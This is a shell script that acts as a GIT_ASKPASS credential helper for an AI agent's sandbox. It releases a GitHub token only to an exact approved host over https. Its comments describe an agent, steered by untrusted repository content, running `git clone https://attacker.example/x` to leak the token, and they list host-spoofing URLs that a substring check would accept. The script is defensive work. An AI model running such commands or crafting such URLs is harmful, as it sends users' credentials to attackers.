#!/bin/sh
# GIT_ASKPASS helper: git calls this once for the username and once for the password when it needs
# HTTPS credentials. The token therefore never appears in the remote URL, the shell environment of
# tool subprocesses, or the command line.
#
# Credentials are released ONLY for the approved host. GIT_ASKPASS is set image-wide, so this also
# answers git commands the agent itself starts, and the agent is driven by a model that reads
# untrusted repository content: without a host check, `git clone https://attacker.example/x` inside
# the workspace makes git send the real PAT to that server as Basic auth, which is exactly the
# exfiltration GIT_ASKPASS exists to prevent.
#
# The host is compared for EXACT equality against the authority of the URL git names in its prompt.
# A substring test would accept `github.com.evil.test` and `https://github.com@evil.test`.
#
# POSIX sh, no external commands. Every failure path prints nothing on stdout and exits non-zero,
# so git fails authentication instead of reading an empty string as a valid password.
set -eu

prompt=${1:-}

# Approved host. Unset falls back to the only forge the product supports; set-but-empty is a
# misconfiguration and must fail closed rather than match anything.
allowed=${AH_GIT_ALLOWED_HOST-github.com}
if [ -z "$allowed" ]; then
  echo "askpass: AH_GIT_ALLOWED_HOST is set but empty; refusing to release credentials" >&2
  exit 1
fi

# Git prompts look like: Password for 'https://x-access-token@github.com'
# Take what is between the first pair of single quotes, require https, then reduce what is left to
# a bare host: keep the authority (up to the first "/"), drop any userinfo (up to the last "@").
# A prompt without quotes leaves `prompt` unchanged, which is not an https URL and is refused.
url=${prompt#*\'}
url=${url%%\'*}

# The scheme must be https. A host check alone would answer `http://github.com`, and git would
# then send the token in cleartext, readable by anything on the path.
case "$url" in
  https://*) ;;
  *)
    echo "askpass: refusing to release credentials over a non-https URL" >&2
    exit 1
    ;;
esac

authority=${url#https://}
authority=${authority%%/*}
host=${authority##*@}

# Reject an explicit port. The authority must name the approved host on the default HTTPS port:
# `github.com:8443` is still `github.com` to a substring or host-only test, but it is not the
# service this token belongs to, and the repository-URL schema already refuses non-default ports.
case "$host" in
  *:*)
    echo "askpass: refusing to release credentials to a non-default port" >&2
    exit 1
    ;;
esac

if [ "$host" != "$allowed" ]; then
  echo "askpass: refusing to release credentials to a host other than $allowed" >&2
  exit 1
fi

case "$prompt" in
  *Username*|*username*)
    printf '%s\n' "x-access-token"
    ;;
  *)
    # Token source, in order: a tmpfs file named by AH_GIT_TOKEN_FILE, then GITHUB_TOKEN. The file
    # exists so the agent runtime can keep the PAT out of the environment it hands to the shell
    # tool's children while git, which runs with that same scrubbed environment, can still
    # authenticate. The host check above is deliberately independent of where the token came from.
    token=${GITHUB_TOKEN:-}
    if [ -n "${AH_GIT_TOKEN_FILE:-}" ] && [ -r "$AH_GIT_TOKEN_FILE" ]; then
      # `read` is a shell builtin, so no PATH lookup happens: a workspace that controls PATH cannot
      # interpose a program between the token file and this script. It reports failure on a file
      # with no trailing newline while still assigning the value, hence the `|| :`.
      IFS= read -r token < "$AH_GIT_TOKEN_FILE" || :
    fi

    # An empty token is not a token. Printing it would hand git a valid empty password and turn a
    # misconfiguration into a confusing authentication failure against the real GitHub.
    if [ -z "$token" ]; then
      echo "askpass: no GitHub token available" >&2
      exit 1
    fi
    printf '%s\n' "$token"
    ;;
esac
